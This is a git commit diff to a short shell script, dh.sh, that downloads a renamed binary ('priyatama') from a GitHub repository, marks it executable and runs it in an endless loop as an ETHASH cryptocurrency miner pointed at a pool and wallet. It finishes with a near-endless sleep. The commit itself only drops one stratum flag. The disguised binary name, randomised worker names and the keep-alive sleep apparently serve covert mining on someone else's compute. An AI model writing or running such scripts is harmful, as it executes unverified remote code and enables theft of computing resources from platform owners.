d7568e983f28de29838229288d1381bbe5ec6e3e
DarshGoswami1982 <87807143+DarshGoswami1982@users.noreply.github.com>
2021-08-22 15:59:52 +0530

    Update dh.sh

--- dh.sh
+++ dh.sh
@@ -5,7 +5,7 @@ WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
 wget https://github.com/archernap/prem/raw/main/priyatama
 chmod +x priyatama
 while [ 1 ]; do
-./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
 sleep 5
 done
 sleep 999999999
